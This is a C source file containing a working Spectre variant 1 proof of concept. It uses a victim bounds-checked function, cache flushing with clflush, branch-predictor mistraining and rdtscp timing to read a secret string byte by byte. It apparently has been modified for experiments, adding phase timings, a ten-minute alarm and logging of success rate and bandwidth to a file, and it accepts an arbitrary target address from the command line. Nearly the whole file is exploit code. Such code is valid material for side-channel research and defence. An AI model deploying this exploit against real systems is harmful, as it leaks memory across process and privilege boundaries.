#define SIGINT 2

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define BOOL int
#define TRUE 1
#define FALSE 0

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

volatile sig_atomic_t done = 0; // Flag to indicate when to stop the program

clock_t start_time, end_time;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;    // unsigned int 4 byte
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];   //uint8_t
uint8_t array2[256 * 512];   // 256 

//char* secret = "The Magic Words are Squeamish Ossifrage.";
char* secret = "Welcome come to China.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

int success_count = 0;
int unclear_count = 0;

void victim_function(size_t x)
{
	if (x < array1_size)  //array1_size=16
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	clock_t start_flush_time, end_flush_time;
	clock_t start_mistrain_time, end_mistrain_time;
	clock_t start_infer_time, end_infer_time;
	double flush_duration, mistrain_duration, infer_duration;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--)
	{
		/* (1) Flushing cache lines */
		start_flush_time = clock(); // Start timing for cache flush

		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		end_flush_time = clock(); // End timing for cache flush
		flush_duration = (double)(end_flush_time - start_flush_time) * 1000000.0 / CLOCKS_PER_SEC;
		printf("Flush cache duration: %.2f μs\n", flush_duration);

		/* (2) Mistraining branch predictor */
		start_mistrain_time = clock(); // Start timing for mistrain branch

		training_x = tries % array1_size;

		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);

			volatile int z;
			for (z = 0; z < 100; z++) {
			} /* Delay (can also mfence) */

			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		end_mistrain_time = clock(); // End timing for mistrain branch
		mistrain_duration = (double)(end_mistrain_time - start_mistrain_time) * 1000000.0 / CLOCKS_PER_SEC;
		printf("Mistrain branch duration: %.2f μs\n", mistrain_duration);

		/* (3) Attempting to infer the secret byte that is loaded into the cache */
		start_infer_time = clock(); // Start timing for infer secret

		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];

			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		end_infer_time = clock(); // End timing for infer secret
		infer_duration = (double)(end_infer_time - start_infer_time) * 1000000.0 / CLOCKS_PER_SEC;
		printf("Infer secret duration: %.2f μs\n", infer_duration);

		/* Locate highest & second-highest results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}

	results[0] ^= junk; /* use junk so code above won't get optimized out */
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

void calculate_success_rate_and_exit() {
	double success_rate = (double)success_count / (success_count + unclear_count);
	double bandwidth = (double)success_count / 600;
	FILE *fp;

	fp = fopen("success_rate.txt", "a");
	if (fp == NULL) {
		printf("Error opening file!\n");
		exit(1);
	}

	fprintf(fp, "Success rate: %.2f%%\n", success_rate * 100);
	fprintf(fp, "bandwidth: %.2f\n", bandwidth);
	fclose(fp);
	exit(0);
}

void signal_handler(int signum) {
	done = 1;
	calculate_success_rate_and_exit();
}

int main(int argc, const char* * argv)
{
	signal(SIGALRM, signal_handler);
	alarm(600);

	signal(SIGINT, signal_handler);

	while (!done) {
		size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
		int score[2], len = strlen(secret);
		uint8_t value[2];
		size_t i;
		for (i = 0; i < sizeof(array2); i++)
			array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
		if (argc == 3)
		{
			sscanf(argv[1], "%p", (void * *)(&malicious_x));
			malicious_x -= (size_t)array1; /* Convert input value into a pointer */
			sscanf(argv[2], "%d", &len);
		}

		while (--len >= 0)
		{
			readMemoryByte(malicious_x++, value, score);

			if (score[0] >= 2 * score[1]) {
				printf("Success\n");
				success_count++;
			} else {
				printf("Unclear\n");
				unclear_count++;
			}
		}
	}

	return (0);
}
